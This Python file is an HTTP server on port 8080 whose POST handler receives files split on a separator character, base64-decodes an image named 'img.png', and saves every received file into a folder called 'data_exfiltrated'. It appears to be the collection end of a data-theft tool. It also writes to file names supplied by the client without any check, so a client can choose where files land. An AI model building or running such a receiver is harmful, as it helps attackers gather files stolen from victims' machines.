import os
import base64

from http.server import BaseHTTPRequestHandler, HTTPServer

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        message = "Hello, World! Here is a GET response"
        self.wfile.write(bytes(message, "utf8"))
        print(self.request)
        
        
        
        
        
        
        
        
    def do_POST(self):
        
        
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()



        received_files=post_data.decode().split("\u0001")
        for file in received_files :
                name_file=file.split("file : ")[1].split("\n")[0] #take str between "file" and return (\n)
                if name_file =="img.png" :
                
                    #format file
                    file = file.split("png\n")[1]
                    file = file.encode() #repasse en bytestr
                    file = base64.b64decode(file + b'==') #retour en bytes
                
                
                
                    print(name_file+" is THAT ONE!")
                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "wb")
                    temp_file_to_write.write(file)
                    temp_file_to_write.close() 
                else :
                    print(name_file+" is here!")
                    print(file)
                    temp_file_to_write = open("./data_exfiltrated/"+name_file, "w", encoding="UTF-8") 
                    temp_file_to_write.write(file)
                    temp_file_to_write.close() 


with HTTPServer(('', 8080), handler) as server:
    server.serve_forever()
